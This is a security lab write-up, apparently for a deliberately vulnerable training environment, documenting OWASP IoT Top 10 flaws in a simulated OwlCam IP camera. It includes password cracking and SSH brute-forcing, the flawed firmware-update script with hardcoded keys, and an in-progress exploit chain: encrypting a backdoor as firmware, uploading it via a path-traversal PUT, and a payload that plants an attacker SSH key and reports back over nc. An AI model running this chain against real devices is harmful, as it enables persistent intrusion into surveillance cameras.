---
id: "OWLCAM-IOT"
title: "OwlCam IoT Camera Vulnerabilities (OWASP IoT Top 10 2018)"
category: IoT
status: IN PROGRESS
severity: "High to Medium (per finding)"
owasp: "OWASP IoT Top 10 (2018): IoT1 Weak/Guessable/Hardcoded Passwords, IoT2 Insecure Network Services, IoT3 Insecure Ecosystem Interfaces, IoT4 Lack of Secure Update Mechanism"
cwe:
  - "CWE-798 Use of Hard-coded Credentials (IoT1)"
  - "CWE-319 Cleartext Transmission of Sensitive Information (IoT2)"
  - "CWE-284 Improper Access Control (IoT3)"
  - "CWE-347 Improper Verification of Cryptographic Signature, CWE-494 Download of Code Without Integrity Check (IoT4)"
affected_components:
  - "labs/owlcam/files/etc/init.d/update-firmware"
  - "labs/owlcam/files/etc/init.d/camera-streamer"
  - "labs/owlcam/files/etc/camapi/config_vuln.json"
findings:
  - "IoT1: DONE"
  - "IoT2: PENDING"
  - "IoT3: PENDING"
  - "IoT4: IN PROGRESS"
---

# IoT1:2018 Weak, Guessable, Hardcoded Passwords

The simulated camera is an [Aviosys 9060ASL](https://devices.luxriot.com/device/aviosys/9060asl-i-o). This is useful reconnaissance, the documented vendor default for these IP cameras is _"admin:12345678"_. On the lab device the OpenWRT SSH account is _root_ with the same weak password, so testing _root:12345678_ confirms that SSH access to the device is possible.

We can get the model of the camera IP model by analysing the ssh connection. Dropbear shows us some information if we use `ssh -v` flag.

![[iot1_ssh_verbose.png]]

And search for default credentials for this kind of 

![[iot1_default_password.png]]

It is also straightforward to perform a brute-force attack on the password hash:

```zsh
❯ hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt --show
$5$/BwXdZAF8Ffbwwp5$UhB0XqwRs71Y6ESLbJm00X9OB8o7wfutwexvMqJZQV3:12345678
```

Or brute-force the SSH service using Hydra:

![[iot1_hydra.png]]

Although it may seem unusual, **Secure Shell (SSH)** services are quite common in professional-grade video surveillance cameras and IoT devices. While entry-level models often omit this service, manufacturers targeting the enterprise or security markets frequently include SSH or Telnet access as a standard feature for diagnostics and configuration.

The rationale is that SSH enables administrators and technicians to remotely access the camera for troubleshooting, advanced configuration, maintenance, and also **security audits**.

It is also important to note that the update script contains a hardcoded signature used for validation. This practice significantly weakens the security of the firmware update process, as an attacker who discovers the hardcoded value can bypass signature verification and upload unauthorized or malicious firmware (see [[#IoT4:2018 - Lack of Secure Update Mechanism|Unsecure update mechanism]]).

# IoT2:2018 - Insecure Network Services

In video surveillance systems and IP cameras, video streaming is typically performed using protocols such as HTTP or RTSP. In this environment, there is no evidence of TLS/SSL usage, neither in the service startup scripts nor in the firewall configuration, which means that the streaming is transmitted in **plain text**.

1. An attacker on the same network as the IP camera can capture network traffic and intercept the video stream in real time.
2. If streaming authentication credentials are also transmitted in plain text, they can be intercepted and reused.
3. If the protocol allows, an attacker could inject commands and manipulate the video stream.
4. The IP camera monitoring system can be deceived by replaying captured traffic to simulate activity.

The system should include scripts to manage certificates and enable RTSP over TLS. Additionally, streaming authentication should be enforced, the number of connections should be limited to prevent DoS attacks, and all access and access attempts should be logged to improve traceability in the event of an attack.

# IoT3:2018 - Insecure Ecosystem Interfaces (API)

The video stream is transmitted to a simulated API server running in Docker. Please refer to the documentation for instructions on deploying the services related to the [[API/Vulnerabilities|API]] and review the multiple vulnerabilities that expose the video surveillance service, including the possibility of accessing live streams without proper authorization.

# IoT4:2018 - Lack of Secure Update Mechanism

The API allows firmware updates to be performed on the managed devices. If an attacker is able to upload a malicious file disguised as a legitimate firmware image to the server, or trick the endpoint into issuing a firmware update command that points to a firmware file hosted on the attacker's machine, arbitrary code execution on the embedded device in production becomes possible.

In the case of the surveillance camera, this vulnerability could be exploited to deploy a backdoor by executing malware that establishes a reverse connection to the attacker's system. This scenario constitutes a _file upload vulnerability_ combined with _Remote Code Execution (RCE)_, enabling an attacker to gain persistent and unauthorized access to the device.

To mitigate this risk, it is essential to implement strict validation of firmware files, enforce cryptographic signature verification, and restrict update sources to trusted repositories only.  

## Demonstration

> **IN PROGRESS**

We have discovered that the camera listing at the _/cameras_ endpoint includes a button that allows users to initiate firmware updates for their installed cameras.

![[iot4_firmares_latest_version.png]]

The button sends a GET request to _/firmware/latest-version_. By accessing the _/firmware_ endpoint, it is possible to view a list of available firmware executables.

![[api4_firmware_list.png]]

If we want to replicate the firmware update mechanism of customer cameras to see if it is possible to inject malware code into these devices, we need to know if we can upload data to this path, how the server detects that there is new firmware, how the server validates whether the firmware is secure or if it does so, how the camera validates it, etc.

We start by trying to download the firmware to see what's inside. We can see that we don't have access as a client user.

![[api10_cannot_download_latest_firmware.png]]

What we can conclude is that downloading the service depends on a GET request with the *file* parameter. If we manage to alter our JWT beforehand, we will be able to download the firmware. If this is not the case, there is still a way to obtain this data.

By analyzing the firmware image running on the camera, it is possible to locate the script responsible for executing the new firmware version downloaded from the server. Within this script, both the signature used to validate the firmware and the secret key used to encrypt the file are hardcoded. Additionally, the validation mechanism is simplistic, requiring only that the firmware file contains the specified signature within its lines. In this simulation, rather than performing an actual installation, the script emulates the firmware update process by executing a corresponding script.

The script responsible for updating the firmware decrypts the downloaded firmware file and subsequently executes it. By analyzing the line that performs decryption using _openssl_, and leveraging this information, it is possible to upload a malicious firmware version to the server that is correctly encrypted and contains the required signature for installation.

As a result, all users who log into the system will be presented with the option to update their cameras with this malicious firmware, enabling the attacker to establish a backdoor, for example, on the camera controllers of other users.

```zsh
#!/bin/sh
# /etc/init.d/update-firmware
URL="$1"
if [ -z "$URL" ]; then
    echo "Use: $0 <Firmware-URL>?file=<encrypted-firmware-file>"
    exit 1
fi

SECRET="k3yVulnC4m"
TIMESTAMP=$(date +%s)
DEVICE_ID="cam3"
DATA_TO_SIGN="${TIMESTAMP}${DEVICE_ID}"
SIGNATURE=$(echo -n "$DATA_TO_SIGN" | openssl dgst -sha256 -hmac "$SECRET" | awk '{print $2}')
FIRMWARE_PATH="/tmp/update.enc"
FIRMWARE_SIGNATURE='FIRMWARE_SIGNATURE: VulnZoo-2025-SECURE'

curl -v "$URL" \
    -H "X-Device: $DEVICE_ID" \
    -H "X-Timestamp: $TIMESTAMP" \
    -H "X-Signature: $SIGNATURE" \
    -o "$FIRMWARE_PATH"

if ! grep -q "$FIRMWARE_SIGNATURE" "$FIRMWARE_PATH"; then
    echo "Firmware signature verification failed. Update aborted."
    exit 1
fi

openssl enc -d -aes-256-cbc -in "$FIRMWARE_PATH" -out "/tmp/update.sh" -k 'supersecret'
chmod +x /tmp/update.sh
```

Despite this, the contents of the firmware files are not directly accessible. However, a vulnerability exists in the API at the _/api/status_ endpoint (see more in [[API/Vulnerabilities#API9:2023 - Improper Inventory Management|Improper Inventory Management]]). This endpoint is susceptible to a Local File Inclusion (LFI) attack, which allows an attacker to view the contents of files stored on the server controller. Access to the firmware data can be achieved either through Local File Inclusion (LFI) or by utilizing the same mechanism employed by the _update-firmware_ process.

![[api10_firmware_download.png]]

By analyzing the endpoint using the OPTIONS method, we observe that the PUT method is allowed for requests in */api/status* endpoint. This method enables users to modify and upload files to the server.

With this information, an attacker can create malware that is stored on the API server, which will notify users that a firmware update is available for their cameras. Once users initiate the update, the malicious code will be executed on their devices. The attacker can leverage this to establish persistent connections to the cameras of all clients, for example, by using tools such as *Metasploit*.

```zsh
openssl enc -d -aes-256-cbc -in firmware-v1.0.3 -out prueba.sh
```

```zsh
openssl enc -aes-256-cbc -salt -pbkdf2 -in malware.sh -out firmware-v1.0.4 -k 'supersecret'
```

```zsh
curl -X PUT --data-binary @malware "http://192.168.2.2:5000/api/status?feature=....//vulnzoo/firmware/firmware-v1.0.4"
{
  "feature": "....//vulnzoo/firmware/firmware-v1.0.4",
  "status": "file updated"
}
```

This attack becomes even more effective considering that, in this simulation, the attacker has access to their own camera. In other words, an attacker could use the same device provided by the surveillance company to extract the internal mechanisms of the controller and identify which tools are installed on it. In this scenario, it is possible to obtain a reverse shell by adding SSH public keys to the [Dropbear](https://oldwiki.archive.openwrt.org/doc/howto/dropbear.public-key.auth) (SSH) authorized keys file.

We generate our public key to obtain persistent access to the camera.

![[api10_ssh_key_generated.png]]

```zsh
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_vulnzoo
```

We create malware that inserts the attacker's public key into the required path on the compromised camera.

![[api10_malware_as_firmware.png]]

```bash
RSA_KEY="ssh-rsa ..."

tee -a /etc/dropbear/authorized_keys <<EOF
$RSA_KEY
EOF

if [ -f /etc/dropbear/authorized_keys ]; then
  echo "TRAPPED" | nc 192.168.2.2 5000
else
  echo "Public key not included" | nc 192.168.2.2 5000
fi
```

Subsequently, we use our connection to the API and the _/firmware_ endpoint with the PUT method to upload the malicious code to the server. The attacker keeps their system listening, and when a client initiates the update process, the public key is inserted into their devices.

> **Cron can be used as if an user is trying to install latest firmware, so attacker can obtain access to the victim's machine.**

